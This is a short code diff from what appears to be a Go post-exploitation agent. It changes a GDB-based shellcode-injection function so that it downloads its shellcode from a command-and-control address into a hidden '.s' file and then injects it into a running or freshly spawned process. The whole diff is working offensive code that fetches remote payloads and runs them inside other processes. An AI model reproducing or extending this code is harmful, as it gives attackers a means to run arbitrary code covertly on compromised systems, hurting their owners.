@@ -10,7 +10,7 @@ import (
 // GDBInjectShellcode inject shellcode to a running process using GDB
 // start a `sleep` process and inject to it if pid == 0
 // gdb command: set (char[length])*(int*)$rip = { 0xcc }
-func GDBInjectShellcode(shellcodeFile string, pid int) error {
+func GDBInjectShellcode(pid int) error {
 	if pid == 0 {
 		cmd := exec.Command("sleep", "10")
 		err := cmd.Start()
@@ -18,6 +18,11 @@ func GDBInjectShellcode(shellcodeFile string, pid int) error {
 			return err
 		}
 		pid = cmd.Process.Pid
+	}
+	shellcodeFile := AgentRoot + "/.s"
+	err := DownloadViaCC(CCAddress+"/shellcode.txt", shellcodeFile)
+	if err != nil {
+		return err
 	}
 	shellcode, err := ioutil.ReadFile(shellcodeFile)
 	if err != nil {
